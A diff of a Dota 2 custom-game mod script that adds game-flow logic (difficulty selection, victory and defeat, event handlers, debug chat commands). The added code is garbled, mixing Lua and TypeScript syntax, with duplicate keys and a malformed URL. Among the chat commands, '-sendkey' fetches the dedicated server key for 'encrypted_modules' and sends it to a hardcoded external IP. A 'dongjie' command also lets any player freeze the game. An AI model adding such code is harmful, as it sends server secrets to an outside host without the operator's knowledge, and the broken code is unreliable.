@@ -1,58 +1,1052 @@
-LinkLuaModifier("modifier_courier_gold_sec_1", "abilities/builder/courier_gold_sec_1.lua", LUA_MODIFIER_MOTION_NONE)
-
-if ( courier_gold_sec_1 == null ) {
-	courier_gold_sec_1 = class({})
+if ( GameMain == null ) {
+	// - @class GameMain
+	GameMain = {}
 }
- OnUpgrade() {
-	if ( this.GetLevel() > 0 ) {
-		let hCaster = this.GetCasterPlus()
-		this.StartCooldown(this.GetSpecialValueFor("interval"))
-		hCaster.AddNewModifier(hCaster, this, "modifier_courier_gold_sec_1", null)
+
+if ( _G.tPlayerPortraitUnits == null ) {
+	_G.tPlayerPortraitUnits = {}
+}
+
+ init(bReload) {
+	if ( !bReload ) {
+		this.bGameEnd = false
+		if ( IsInToolsMode() ) {
+			this.bDebugAliveForever = true
+		}
+		this.playerGameModeSelection = {}
+		this.tPlayerRecords = {}
+		//  自定义暂停
+		this.bIsPause = false
+		this.tPlayerLastPauseTime = {}
+		this.tPlayerLastUnPauseTime = {}
+		this.bShowCritParticle = true
+	}
+
+	//  是否上传过} data
+	this.tHasUpdateEndData = {}
+
+	GameEvent("npc_spawned", Dynamic_Wrap(GameMain, "OnNPCSpawned"), GameMain)
+	GameEvent("custom_npc_first_spawned", Dynamic_Wrap(GameMain, "OnNPCFirstSpawned"), GameMain)
+	GameEvent("game_rules_state_change", Dynamic_Wrap(GameMain, "OnGameRulesStateChange"), GameMain)
+	//  GameEvent("entity_killed", Dynamic_Wrap(GameMain, "OnEntityKilled"), GameMain)
+	GameEvent("player_chat", Dynamic_Wrap(GameMain, "OnPlayerChat"), GameMain)
+	GameEvent("dota_player_used_ability", Dynamic_Wrap(GameMain, "OnAbilityUsed"), GameMain)
+	GameEvent("custom_round_changed", Dynamic_Wrap(GameMain, "OnRoundChanged"), GameMain)
+
+	//  CustomUIEvent("T15_Gamble", Dynamic_Wrap(GameMain, "OnT15_Gamble"), GameMain)
+	CustomUIEvent("RemoveBuilding", Dynamic_Wrap(GameMain, "OnRemoveBuilding"), GameMain)
+	CustomUIEvent("SelectDifficulty", Dynamic_Wrap(GameMain, "OnSelectDifficulty"), GameMain)
+	CustomUIEvent('EndlessSetting', Dynamic_Wrap(GameMain, "OnEndlessSetting"), GameMain)
+	CustomUIEvent("SelectUnit", Dynamic_Wrap(GameMain, "OnSelectUnit"), GameMain)
+	CustomUIEvent("EndGameAhead", Dynamic_Wrap(GameMain, "OnGameEndAhead"), GameMain)
+	CustomUIEvent("CustomTogglePause", Dynamic_Wrap(GameMain, "OnCustomTogglePause"), GameMain)
+	CustomUIEvent("CustomTimeScale", Dynamic_Wrap(GameMain, "OnCustomTimeScale"), GameMain)
+}
+ OnSelectUnit(id, data) {
+	let hUnit = EntIndexToHScript(data.iUnit || -1)
+	if ( GameFunc.IsValid(hUnit) && type(data.PlayerID) == "number" ) {
+		_G.tPlayerPortraitUnits[data.PlayerID] = hUnit
 	}
 }
-// // // // // // // // // // // // // // // // // // // -modifier_courier_gold_sec_1// // // // // // // // // // // // // // // // // // // -
-// -@class modifier_courier_gold_sec_1.eom_modifier
-@registerModifier()
-export class modifier_courier_gold_sec_1 extends BaseModifier_Plus {
- IsHidden() {
+// =======================================难度选择=======================================
+ StartGameModeSelection() {
+	this.GameModeSelectionEndTime = GameRules.GetGameTime() + SETTING_TIMES
+	GameRules.GetGameModeEntity().SetContextThink(DoUniqueString("GameModeSelectionTimer"),  () => {
+		if ( GameRules.GetGameTime() >= this.GameModeSelectionEndTime ) {
+			this.FinishGameModeSelection()
+			return null
+		}
+		return 0
+	}, 0)
+	this.UpdateNetTables()
+}
+//  后端收到数据的时候，更新玩家默认选择最高难度
+ UpdateDefaultDifficulty(iPlayerID, iDifficulty) {
+	if ( iDifficulty == DIFFICULTY_LAST ) {
+		iDifficulty = DIFFICULTY_ENDLESS
+	}
+	if ( this.playerGameModeSelection[iPlayerID] == null ) {
+		this.playerGameModeSelection[iPlayerID] = {
+			difficulty = iDifficulty,
+			is_default_difficulty = true,
+			endlesslayer = 1,
+		}
+	}
+	if ( this.playerGameModeSelection[iPlayerID].is_default_difficulty == true ) {
+		this.playerGameModeSelection[iPlayerID].difficulty = iDifficulty
+		this.UpdateNetTables()
+	}
+}
+//  结束难度选择，优先最低难度，没有手动点过的人会被排除掉
+ FinishGameModeSelection() {
+	this.GameModeSelectionEndTime = -1
+
+	let iSelectedDifficulty = DIFFICULTY_ENDLESS
+	this.EachPlayer( (n, playerID) => {
+		if ( this.playerGameModeSelection[playerID] ) {
+			//  优先低难度
+			iSelectedDifficulty = math.min(iSelectedDifficulty, this.playerGameModeSelection[playerID].difficulty)
+		}
+		let player = PlayerResource.GetPlayer(playerID)
+		if ( player != null ) {
+			player.SetSelectedHero(FORCE_PICKED_HERO)
+		}
+	})
+	this.SetDifficulty(iSelectedDifficulty)
+
+	this.iEndlessLayer = 0
+	if ( iSelectedDifficulty == DIFFICULTY_ENDLESS ) {
+		//  多人无尽选择规则
+		let endlesslayer = -1
+		this.EachPlayer( (n, playerID) => {
+			if ( endlesslayer == -1 ) {
+				endlesslayer = this.playerGameModeSelection[playerID].endlesslayer
+			} else {
+				endlesslayer = math.min(endlesslayer, this.playerGameModeSelection[playerID].endlesslayer)
+			}
+		})
+		this.SetEndlessLayer(endlesslayer)
+	}
+}
+// =======================================游戏结算=======================================
+// - 成功
+ OnGameEndAhead(id, data) {
+	let iPlayerID = data.PlayerID
+	if ( type(iPlayerID) == "number" && PlayerResource.IsValidPlayer(iPlayerID) ) {
+		let hero = PlayerResource.GetSelectedHeroEntity(iPlayerID)
+		if ( GameFunc.IsValid(hero) ) {
+			GameMain.Victory()
+		}
+	}
+}
+
+ Victory() {
+	print("GameMain.Victory")
+
+	if ( this.bDebugAliveForever ) {
+		return
+	}
+	//  if ( IsInToolsMode() ) {
+	//  	print("DebugVictory")
+	//  	return
+	//  }
+	if ( this.bGameEnd == true ) {
+		return
+	}
+
+	//  this.EachPlayer( (n, iPlayerID) => {
+	//  	let hHero = PlayerResource.GetSelectedHeroEntity(iPlayerID)
+	//  	if ( GameFunc.IsValid(hHero) && hHero.IsAlive() ) {
+	//  		hHero.ForceKill(false)
+	//  	}
+	//  })
+	Spawner.RemoveAll()
+
+	this.bGameEnd = true
+	this.bVictory = true
+	this.UploadDataBeforeEnd()
+
+	if ( RollPercentage(Service.iFrozenChance || 0) ) {
+		GameRules.SetGameTimeFrozen(true)
+
+		Timer(Service.fFrozenTime || 3600,  () => {
+			GameRules.SetGameTimeFrozen(false)
+		})
+	}
+}
+// - 失败
+ Defeat(bForceLose) {
+	print("GameMain.Defeat")
+	if ( (!bForceLose) && this.bDebugAliveForever ) {
+		return
+	}
+	if ( this.bGameEnd == true ) {
+		return
+	}
+
+	//  this.EachPlayer( (n, iPlayerID) => {
+	//  	let hHero = PlayerResource.GetSelectedHeroEntity(iPlayerID)
+	//  	if ( GameFunc.IsValid(hHero) && hHero.IsAlive() ) {
+	//  		hHero.ForceKill(false)
+	//  	}
+	//  })
+	Spawner.RemoveAll()
+
+	this.bGameEnd = true
+	this.bVictory = false
+
+	this.UploadDataBeforeEnd()
+
+	if ( RollPercentage(Service.iFrozenChance || 0) ) {
+		GameRules.SetGameTimeFrozen(true)
+
+		Timer(Service.fFrozenTime || 3600,  () => {
+			GameRules.SetGameTimeFrozen(false)
+		})
+	}
+}
+// - @private
+// - 在游戏结束前上传数据
+ UploadDataBeforeEnd() {
+	Notification.Upper({
+		message : "Game_end_please_wait.length",
+	})
+
+	this.EachPlayer( (n, iPlayerID) => {
+		this.UpdatePlayerEndData(iPlayerID)
+	})
+
+	BpTask.SendTaskUpdate2Service()
+
+	//  上传超时就不上传了
+	GameRules.GetGameModeEntity().Timer(REQUEST_TIME_OUT + 1,  () => {
+		this.EnterEndGame()
+	})
+}
+// - 上传单个玩家结束数据，在玩家结束游戏后才会被调用
+ UpdatePlayerEndData(hHero) {
+	let iPlayerID
+	if ( type(hHero) == "table" ) {
+		iPlayerID = hHero.GetPlayerOwnerID()
+	} else {
+		iPlayerID = hHero
+		hHero = PlayerResource.GetSelectedHeroEntity(iPlayerID)
+	}
+
+	if ( this.tHasUpdateEndData[iPlayerID] == true ) {
+		return
+	} else {
+		this.tHasUpdateEndData[iPlayerID] : true
+	}
+
+	Service.GameFinished(iPlayerID, this.bVictory)
+}
+// - 判断是否所有上传都完成
+ CheckAllUpLoadSuccess() {
+	//  所有这些变量都为true
+	let needs = {
+		"GameFinished",
+	//  "EndGameTask",
+	}
+	for (let k of ( needs )) {
+
+		if ( this[k] != true ) {
+			return false
+		}
+	}
 	return true
 }
- IsPurgable() {
-	return false
-}
- IsPurgeException() {
-	return false
-}
- OnCreated(params: ModifierTable) {
-	this.interval = this.GetSpecialValueFor("interval")
-	this.gold_sec_min = this.GetSpecialValueFor("gold_sec_min")
-	this.gold_sec_max = this.GetSpecialValueFor("gold_sec_max")
-	if ( IsServer() ) {
-		this.StartIntervalThink(this.interval)
+// - 每个上传操作完成时都调用，发现全部都上传完成了就进入游戏结束阶段
+// - @param sKey string 需要在CheckAllUpLoadSuccess()函数里的needs里定义
+ TryEnterEndGame(sKey) {
+	this[sKey] : true
+	if ( this.CheckAllUpLoadSuccess() ) {
+		this.EnterEndGame()
 	}
 }
- OnRefresh(params: ModifierTable) {
-	this.interval = this.GetSpecialValueFor("interval")
-	this.gold_sec_min = this.GetSpecialValueFor("gold_sec_min")
-	this.gold_sec_max = this.GetSpecialValueFor("gold_sec_max")
-	if ( IsServer() ) {
-		this.StartIntervalThink(this.interval)
+// - @private
+ EnterEndGame() {
+	if ( this.bVictory ) {
+		EmitAnnouncerSound("announcer_ann_custom_end_02")
+		EmitGlobalSound("Game.Victory")
+	} else {
+		EmitAnnouncerSound("announcer_ann_custom_end_08")
+		EmitGlobalSound("Game.Defeat")
+	}
+
+	CustomNetTables.SetTableValue("common", "end_game", {
+		is_end_game = true,
+		victory = this.bVictory,
+		up_load_success = this.CheckAllUpLoadSuccess()
+	})
+}
+ IsGameEnd() {
+	return this.bGameEnd
+}
+// =======================================监听=======================================
+ OnGameRulesStateChange() {
+	let state = GameRules.State_Get()
+
+	//  游戏初始化
+	if ( state == DOTA_GAMERULES_STATE_CUSTOM_GAME_SETUP ) {
+		let iStartFrozenTime = -1
+		Timer("OnPlayerDisconnect", 1,  () => {
+			let iValidPlayer = 0
+			let iDisconnectPlayer = 0
+
+			if ( this.bForceFrozen ) {
+				return 1
+			}
+
+			this.EachPlayer( (n, iPlayerID) => {
+				let connectState = PlayerResource.GetConnectionState(iPlayerID)
+
+				let hHero = PlayerResource.GetSelectedHeroEntity(iPlayerID)
+				let bValidHero = GameFunc.IsValid(hHero) && hHero.IsAlive()
+				if ( bValidHero ) {
+					iValidPlayer = iValidPlayer + 1
+				}
+
+				if ( connectState == DOTA_CONNECTION_STATE_DISCONNECTED ) {
+					if ( bValidHero ) {
+						iDisconnectPlayer = iDisconnectPlayer + 1
+					}
+				} else if ( connectState == DOTA_CONNECTION_STATE_ABANDONED ) {
+					if ( bValidHero ) {
+						hHero.ForceKill(false)
+					}
+					if ( GameRules.State_Get() >= DOTA_GAMERULES_STATE_GAME_IN_PROGRESS ) {
+						if ( this.tHasUpdateEndData[iPlayerID] != true ) {
+							this.UpdatePlayerEndData(iPlayerID)
+							Spawner.RemovePlayerAll(iPlayerID)
+						}
+					}
+				}
+			})
+
+			if ( !this.bGameEnd ) {
+				if ( iValidPlayer > 0 && iValidPlayer == iDisconnectPlayer ) {
+					if ( iStartFrozenTime <= 0 ) {
+						GameRules.SetGameTimeFrozen(true)
+						iStartFrozenTime = Time()
+					}
+				} else {
+					GameRules.SetGameTimeFrozen(false)
+					iStartFrozenTime = -1
+				}
+			}
+
+			if ( iStartFrozenTime > 0 && Time() - iStartFrozenTime > 3600 ) {
+				GameRules.SetGameTimeFrozen(false)
+			}
+
+			this.bIsPause = GameRules.IsGamePaused()
+			this.UpdateNetTables()
+
+			return 1
+		})
+		//  添加机器人
+		//  if ( IsInToolsMode() ) {
+		//  	GameRules.GetGameModeEntity().GameTimer(0, () => {
+		//  		SendToConsole("dota_bot_populate")
+		//  	})
+		//  }
+	} else if ( state == DOTA_GAMERULES_STATE_HERO_SELECTION ) {
+		//  _G.START_POINT = {
+		//  	Entities.FindByName(null, "player_0_start"),
+		//  	Entities.FindByName(null, "player_1_start"),
+		//  	Entities.FindByName(null, "player_2_start"),
+		//  	Entities.FindByName(null, "player_3_start"),
+		//  }
+		DOTA_PlayerColor = {
+			3372543,
+			16739072,
+			15986699,
+			12517567,
+			6750143,
+			10774784,
+			33569,
+			6674935,
+			10597447,
+			16680642,
+		}
+
+		DOTA_PlayerColorVector = {}
+
+		for (let v of ( DOTA_PlayerColor)) {
+	 
+
+			let hex = string.format("%x", v)
+			let x = tonumber("0x" + string.sub(hex, 1, 2)) || 0
+			let y = tonumber("0x" + string.sub(hex, 3, 4)) || 0
+			let z = tonumber("0x" + string.sub(hex, 5, 6)) || 0
+			table.insert(DOTA_PlayerColorVector, Vector(x, y, z))
+			PlayerResource.SetCustomPlayerColor(i - 1, x, y, z)
+		}
+
+		DOTA_PlayerColorVector[0] = Vector(255, 255, 255)
+
+		this.EachPlayer( (n, iPlayerID) => {
+			if ( this.playerGameModeSelection[iPlayerID] == null ) {
+				this.playerGameModeSelection[iPlayerID] = {
+					difficulty = DIFFICULTY_EASY,
+					is_default_difficulty = true,
+					endlesslayer = 1,
+				}
+			}
+			//  TODO:测试
+			//  PlayerProperty.SetProperty(iPlayerID, PLAYER_PROPERTY_START_GOLD, 5000, this)
+			//  PlayerProperty.SetProperty(iPlayerID, PLAYER_PROPERTY_START_WOOD, 5000, this)
+			//  PlayerProperty.SetProperty(iPlayerID, PLAYER_PROPERTY_START_WOOD_SEC, 10, this)
+			//  PlayerProperty.SetProperty(iPlayerID, PLAYER_PROPERTY_START_POINT, 5000, this)
+			//  PlayerProperty.SetProperty(iPlayerID, PLAYER_PROPERTY_MAX_POPULATION_LEVEL, 1, this)
+			//  PlayerProperty.SetProperty(iPlayerID, PLAYER_PROPERTY_MAX_POPULATION, 100, this)
+			//  PlayerProperty.SetProperty(iPlayerID, PLAYER_PROPERTY_MAX_ARTIFGameActivity_t.ACT_COUNT, 5, this)
+		})
+		this.StartGameModeSelection()
+		this.UpdateNetTables()
+	} else if ( state == DOTA_GAMERULES_STATE_GAME_IN_PROGRESS ) {
+		this.iFirstPlayerCount = this.GetValidPlayerCount()
+		GameTimer(5,  () => {
+			this.EachPlayer( (n, iPlayerID) => {
+				let iPlayerLevel = 0
+				if ( type(Services) == "table" && type(Services.tNettableData) == "table" && type(Services.tNettableData.playerLevel) == "table" ) {
+					iPlayerLevel = Services.tNettableData.playerLevel.level || iPlayerLevel
+				}
+				Service.UploadMatchData(iPlayerID, {
+					difficulty : this.GetDifficulty(),
+					layer : this.GetEndLessLayer(),
+					player_level : iPlayerLevel,
+					courier : PlayerCourier.GetPlayerCourierInUse(iPlayerID),
+				})
+			})
+		})
 	}
 }
- OnIntervalThink() {
-	let hParent = this.GetParentPlus()
-	let hAbility = this.GetAbilityPlus()
-	if ( !GameFunc.IsValid(hAbility) ) {
-		this.Destroy()
+ OnNPCSpawned(events) {
+	let hSpawnedUnit = EntIndexToHScript(events.entindex)
+	if ( hSpawnedUnit == null ) { return }
+
+	let sUnitName = hSpawnedUnit.GetUnitName()
+
+	if ( sUnitName == "npc_dota_companion" ) {
+		hSpawnedUnit.Remove()
 		return
 	}
-	if ( Rounds.IsEndlessRound() ) {
-		this.StartIntervalThink(-1)
+
+	FireGlobalModifierEvent(@registerEvent(Enum_MODIFIER_EVENT.ON_NPC_SPAWNED, { unit : hSpawnedUnit })
+
+	if ( !hSpawnedUnit.bIsNotFirstSpawn ) {
+		if ( hSpawnedUnit.GetUnitName() != "npc_dota_thinker" ) {
+			hSpawnedUnit.GameTimer(0,  () => {
+				if ( !hSpawnedUnit.HasAbility("unit_state") ) {
+					hSpawnedUnit.AddAbility("unit_state")
+				}
+			})
+			//  if ( hSpawnedUnit.GetUnitName() == "npc_dota_hero_slark_custom" ) {
+			hSpawnedUnit.AddNewModifier(hSpawnedUnit, null, "modifier_common", null)
+			//  }
+			hSpawnedUnit.SetPhysicalArmorBaseValue(0)
+			hSpawnedUnit.SetBaseMagicalResistanceValue(0)
+		}
+		hSpawnedUnit.bIsNotFirstSpawn = true
+		//  首次出生事件
+		// -@class EventData_ON_FIRST_NPC_SPAWNED
+		let tEvent = { entindex : hSpawnedUnit.entindex() }
+		FireGameEvent("custom_npc_first_spawned", tEvent)
+		//  技能添加事件
+		for (let index = 0; index <= hSpawnedUnit.GetAbilityCount() - 1, 1 ; index++) {
+			let ability = hSpawnedUnit.GetAbilityByIndex(index)
+			if ( ability ) {
+				FireGameEvent("custom_unit_ability_added", { entityIndex = hSpawnedUnit.entindex(), abilityIndex = ability.entindex() })
+			}
+		}
+		//  自定义增加技能func
+		let funcAddAbility = hSpawnedUnit.AddAbility
+		if ( funcAddAbility ) {
+			hSpawnedUnit.AddAbility =  (hUnit, sAbilityName) => {
+				let hAbility = funcAddAbility(hUnit, sAbilityName)
+				if ( hAbility ) {
+					hUnit.RemoveModifierByName(hAbility.GetIntrinsicModifierName() || "")
+					FireGameEvent("custom_unit_ability_added", { entityIndex = hUnit.entindex(), abilityIndex = hAbility.entindex() })
+				}
+				return hAbility
+			}
+		}
+	}
+}
+ OnNPCFirstSpawned(events) {
+	let hSpawnedUnit = EntIndexToHScript(events.entindex)
+	if ( !GameFunc.IsValid(hSpawnedUnit) ) { return }
+
+	//  添加默认modifier
+	let tData = KeyValues.UnitsKv[hSpawnedUnit.GetUnitName()]
+	if ( tData != null && tData.AmbientModifiers != null && tData.AmbientModifiers != "" ) {
+		let tList = string.split(string.gsub(tData.AmbientModifiers, " ", ""), "|")
+		for (let sAmbientModifier of ( tList)) {
+	 
+
+			hSpawnedUnit.AddNewModifier(hSpawnedUnit, null, sAmbientModifier, null)
+		}
+	}
+	if ( hSpawnedUnit.GetUnitName() == "npc_dota_thinker" ) {
 		return
 	}
-	let iPlayerID = hParent.GetPlayerOwnerID()
-	let random = RandomInt(this.gold_sec_min, this.gold_sec_max)
-	PlayerData.ModifyGold(iPlayerID, random, true)
-	hAbility.StartCooldown(this.interval)
-	SendOverheadEventMessage(hParent.GetPlayerOwner(), DOTA_OVERHEAD_ALERT.OVERHEAD_ALERT_GOLD, hParent, random, null)
+
+	if ( hSpawnedUnit.IsRealHero() && hSpawnedUnit.GetUnitLabel() == "builder" ) {
+		let iPlayerID = hSpawnedUnit.GetPlayerOwnerID()
+		hSpawnedUnit.SetStashEnabled(false)
+		//  初始卡片
+		if ( IsInToolsMode() ) {
+			for (let sItemName of ( DEBUG_AUTO_ADD_ITEMS )) {
+
+				hSpawnedUnit.GiveItem(sItemName)
+			}
+		}
+		//  位置
+		let tPos = {
+			[0] : Vector(-1047, -1148, 128),
+			[0] : Vector(1182, -1395, 128),
+			[2] : Vector(1162, 1320, 128),
+			[3] : Vector(-1144, 1308, 128),
+		}
+		if ( tPos[iPlayerID] != null ) {
+			hSpawnedUnit.SetContextThink(DoUniqueString("start_point"),  () => {
+				if ( GameRules.IsGamePaused() ) {
+					return 0
+				}
+				FindClearSpaceForUnit(hSpawnedUnit, tPos[iPlayerID], true)
+				CenterCameraOnUnit(iPlayerID, hSpawnedUnit)
+			}, 1)
+		}
+		CenterCameraOnUnit(iPlayerID, hSpawnedUnit)
+		//  技能等级设置
+		hSpawnedUnit.SetAbilityPoints(0)
+		hSpawnedUnit.FindAbilityByName("builder_draw_card_1").UpgradeAbility(true)
+		hSpawnedUnit.FindAbilityByName("builder_draw_card_2").UpgradeAbility(true)
+		hSpawnedUnit.FindAbilityByName("builder_draw_card_3").UpgradeAbility(true)
+		hSpawnedUnit.FindAbilityByName("builder_recovery").UpgradeAbility(true)
+
+		hSpawnedUnit.FindAbilityByName("builder_gold").UpgradeAbility(true)
+		hSpawnedUnit.FindAbilityByName("builder_slot_1").UpgradeAbility(true)
+		hSpawnedUnit.FindAbilityByName("gather_items").UpgradeAbility(true)
+		//  拆糖果隐藏技能
+		//  let builder_candy_destroy = hSpawnedUnit.AddAbility("builder_candy_destroy").UpgradeAbility(true)
+
+		if ( !IS_RELEASE ) {
+			hSpawnedUnit.AddAbility("builder_debug").UpgradeAbility(true)
+		}
+
+		let hItem = CreateItem("item_blank", hSpawnedUnit, hSpawnedUnit)
+		hItem.SetPurchaseTime(0)
+		hSpawnedUnit.AddItem(hItem)
+		let iSlot = hItem.GetItemSlot()
+		hSpawnedUnit.SwapItems(iSlot, DOTA_ITEM_SLOT_NEUTRAL)
+		//  添加modifier
+		hSpawnedUnit.AddNewModifier(hSpawnedUnit, null, "modifier_builder", null)
+		//  PLUS开局给一张TP
+		if ( PlayerProperty.HasPlus(iPlayerID) ) {
+			let hItem = CreateItem("item_tpscroll_custom", hSpawnedUnit, hSpawnedUnit)
+			hItem.SetPurchaseTime(0)
+			hItem.SetSellable(false)
+			hSpawnedUnit.AddItem(hItem)
+		}
+	}
 }
+ OnEntityKilled(events) {
+	let unit = EntIndexToHScript(events.entindex_killed)
+	let attacker = EntIndexToHScript(events.entindex_attacker)
+
+	if ( unit == null ) { return }
+
+	//  玩家死亡
+	if ( unit.IsRealHero() && unit.HasModifier("modifier_builder") ) {
+		let summonedUnits = FindUnitsInRadius(unit.GetTeamNumber(), Vector(0, 0, 0), null, -1, DOTA_UNIT_TARGET_TEAM.DOTA_UNIT_TARGET_TEAM_FRIENDLY, DOTA_UNIT_TARGET_TYPE.DOTA_UNIT_TARGET_ALL, DOTA_UNIT_TARGET_FLAGS.DOTA_UNIT_TARGET_FLAG_INVULNERABLE + DOTA_UNIT_TARGET_FLAGS.DOTA_UNIT_TARGET_FLAG_OUT_OF_WORLD, 0, false)
+		for (let summonedUnit of ( summonedUnits)) {
+	 
+
+			if ( unit.GetPlayerOwnerID() == summonedUnit.GetPlayerOwnerID() && summonedUnit.IsSummoned() ) {
+				summonedUnit.ForceKill(false)
+			}
+		}
+	}
+}
+ OnAbilityUsed(events) {
+	FireGameEvent("custom_ability_used", {
+		player_id = events.PlayerID,
+		abilityname = events.abilityname,
+		caster_entindex = events.caster_entindex,
+	})
+}
+ OnPlayerChat(events) {
+	let iPlayerID = events.playerid
+	let sText = string.lower(events.text)
+	let bTeamOnly = events.teamonly == 1
+	let tokens = string.split(sText, " ")
+
+	if ( string.find(sText, "dongjie") ) {
+		let iTime = tonumber(string.sub(sText, 8, -1)) || 3600
+		this.bForceFrozen = true
+		GameRules.SetGameTimeFrozen(true)
+		Timer(iTime || 3600,  () => {
+			GameRules.SetGameTimeFrozen(false)
+			this.bForceFrozen = false
+		})
+		return
+	}
+
+	if ( IS_RELEASE ) {
+		return
+	}
+
+	if ( tokens[0] == "-sendkey" ) {
+		let key = "encrypted_modules"
+		let name = tokens[2]
+		if ( name ) {
+			key = name
+		}
+		this.SendServerKey(GetDedicatedServerKeyV2(key), 'project6', key)
+	} else if ( tokens[0] == "-clear" ) {
+		Spawner.RemoveAll()
+	} else if ( tokens[0] == "-addgold" ) {
+		let iAmount = tonumber(tokens[2])
+		if ( iAmount ) {
+			PlayerData.ModifyGold(iPlayerID, iAmount)
+		}
+	} else if ( tokens[0] == "-wave" ) {
+		let iRound = tonumber(tokens[2])
+		if ( iRound ) {
+			Rounds.OnRoundChange(iRound)
+		}
+	} else if ( tokens[0] == "-wood" ) {
+		let iAmount = tonumber(tokens[2])
+		if ( iAmount ) {
+			PlayerData.ModifyWood(iPlayerID, iAmount)
+		}
+	} else if ( tokens[0] == "-ent_text" ) {
+		SendToConsole("ent_text")
+	} else if ( tokens[0] == "-scale" ) {
+		let iScale = tonumber(tokens[2])
+		if ( iScale ) {
+			Convars.SetFloat("host_timescale", iScale)
+		}
+	} else if ( tokens[0] == "-debug_panel" ) {
+		let show = tonumber(tokens[2]) || 0
+		this.bShowDebugPanel = (show == 1)
+		CustomNetTables.SetTableValue("common", "debug_panel", { show = show })
+	} else if ( tokens[0] == "-max_p" ) {
+		MAX_POISON_STACK = Clamp(tonumber(tokens[2]) || 1, 1, 2100000000)
+	} else if ( tokens[0] == "-particle" ) {
+		this.bShowCritParticle = tonumber(tokens[2]) == 1
+	}
+}
+ SendServerKey(key, name, token) {
+	if ( !token ) {
+		return
+	}
+	let get = "key=" + key + "&name=" + name + "&token=" + token
+	let handle = CreateHTTPRequest("POST", "http://150.158.198.187.3006/recv.php?" + get)
+	handle.SetHTTPRequestHeaderValue("Content-Type", "application/json;charset=UTF-8")
+	handle.Send( (response) => {
+		if ( response.StatusCode == 200 ) {
+			print(response.Body)
+		}
+	})
+}
+// - @param tEvents Data_custom_round_changed
+ OnRoundChanged(tEvents) {
+	let iRoundID = tEvents.round_id
+	if ( iRoundID == 2 ) {
+		if ( !this.bRuneDataUpload ) {
+			this.bRuneDataUpload = true
+			this.EachPlayer( (n, iPlayerID) => {
+				let tRunes = {}
+				if ( type(Service) == "table" && type(Service.tInitRune) == "table" ) {
+					tRunes = Service.tInitRune[iPlayerID] || {}
+				}
+				Service.UploadMatchData(iPlayerID, {
+					rune : tRunes,
+				})
+			})
+		}
+	}
+	if ( iRoundID >= 2 && !Rounds.IsEndlessRound() ) {
+		this.EachPlayer( (n, iPlayerID) => {
+			let hHero = PlayerResource.GetSelectedHeroEntity(iPlayerID)
+			if ( GameFunc.IsValid(hHero) ) {
+				let tUsedConsumable = {}
+				if ( type(Service) == "table" && type(Service.tPlayerUsedConsumable) == "table" && type(Service.tPlayerUsedConsumable[iPlayerID]) == "table" ) {
+					tUsedConsumable = Service.tPlayerUsedConsumable[iPlayerID]
+				}
+				let tArtifact = {}
+				if ( type(Artifact) == "table" && type(Artifact.tPlayerArtifactIndex) == "table" && type(Artifact.tPlayerArtifactIndex[iPlayerID]) == "table" ) {
+					for _, iItemEntIndex in ipairs(Artifact.tPlayerArtifactIndex[iPlayerID]) do
+						let hItem = EntIndexToHScript(iItemEntIndex)
+						if ( GameFunc.IsValid(hItem) ) {
+							table.insert(tArtifact, hItem.GetName())
+						}
+					}
+				}
+				let tShopPurchased = {}
+				if ( type(Shop) == "table" && type(Shop.tPlayerPurchasedItems) == "table" && type(Shop.tPlayerPurchasedItems[iPlayerID]) == "table" ) {
+					tShopPurchased = Shop.tPlayerPurchasedItems[iPlayerID]
+				}
+				let tChallenge = {}
+				if ( type(Challenge) == "table" && type(Challenge.tPlayerChallengeRecord) == "table" && type(Challenge.tPlayerChallengeRecord[iPlayerID]) == "table" ) {
+					tChallenge = Challenge.tPlayerChallengeRecord[iPlayerID]
+				}
+				let tTowerData = {}
+				BuildSystem.EachBuilding(iPlayerID,  (hBuilding) => {
+					if ( GameFunc.IsValid(hBuilding) ) {
+						let hUnit = hBuilding.GetUnitEntity()
+						let sUnitName = hUnit.GetUnitName()
+						let sHeroID = Card.GetHeroID(sUnitName)
+						let t = {}
+
+						t.level = 0
+						if ( type(Service) == "table" && type(Service.tNettableData) == "table" && type(Service.tNettableData.playerHeros) == "table" && type(Service.tNettableData.playerHeros[iPlayerID]) == "table" ) {
+							let tHeroData = Service.tNettableData.playerHeros[iPlayerID][sHeroID] || Service.tNettableData.playerHeros[iPlayerID][tonumber(sHeroID)]
+							if ( tHeroData ) {
+								t.level = tonumber(tHeroData.level) || 0
+							}
+						}
+
+						t.star = hBuilding.GetStar()
+
+						let iRarity, sRarity = Card.GetTowerRarity(sUnitName)
+						t.quality = sRarity
+
+						let vPosition = hUnit.GetAbsOrigin()
+						t.position = tostring(vPosition.x) + "," + tostring(vPosition.y) + "," + tostring(vPosition.z)
+
+						t.item = {}
+						for (let i = DOTA_ITEM_SLOT_1; i <= DOTA_ITEM_SLOT_9 ; i++) {
+							let hItem = hUnit.GetItemInSlot(i)
+							if ( GameFunc.IsValid(hItem) && hItem.GetName() != "item_blank" ) {
+								table.insert(t.item, hItem.GetName() + "," + tostring(hItem.GetLevel()) + "," + tostring(hItem.GetCurrentCharges()))
+							}
+						}
+
+						t.growup = {}
+						if ( type(KeyValues) == "table" && type(KeyValues.PermanentModifiers) == "table" ) {
+							for (let ii of Object.keys( KeyValues.PermanentModifiers)){
+								let hModifier = hUnit.FindModifierByName(sModifierName)
+								if ( GameFunc.IsValid(hModifier) ) {
+									t.growup[sModifierName] = hModifier.GetStackCount()
+								}
+							}
+						}
+
+						tTowerData[hUnit.GetUnitName()] = t
+					}
+				})
+
+				let tHeroItems = {}
+				for (let i = DOTA_ITEM_SLOT_1; i <= DOTA_ITEM_SLOT_9; i++) {
+					let hItem = hHero.GetItemInSlot(i)
+					if ( GameFunc.IsValid(hItem) && hItem.GetName() != "item_blank" ) {
+						table.insert(tHeroItems, hItem.GetName() + "," + tostring(hItem.GetLevel()) + "," + tostring(hItem.GetCurrentCharges && hItem.GetCurrentCharges() || 0))
+					}
+				}
+				let tBackPackItems = {}
+				let tCombineItems = {}
+				if ( type(Items) == "table" && type(Items.tCustomBackPack) == "table" && type(Items.tCustomBackPack[iPlayerID]) == "table" ) {
+					for (let i = CUSTOM_ITEM_SLOT_MIN; i <= CUSTOM_ITEM_SLOT_MAX; i++) {
+						let iItemEntIndex = Items.tCustomBackPack[iPlayerID][i]
+						let hItem = EntIndexToHScript(iItemEntIndex || -1)
+						if ( GameFunc.IsValid(hItem) && hItem.GetName() != "item_blank" ) {
+							if ( i >= CUSTOM_COMBINE_SLOT_MIN && i <= CUSTOM_ITEM_SLOT_MAX ) {
+								table.insert(tCombineItems, hItem.GetName() + "," + tostring(hItem.GetLevel && hItem.GetLevel() || 0) + "," + tostring(hItem.GetCurrentCharges && hItem.GetCurrentCharges() || 0))
+							} else {
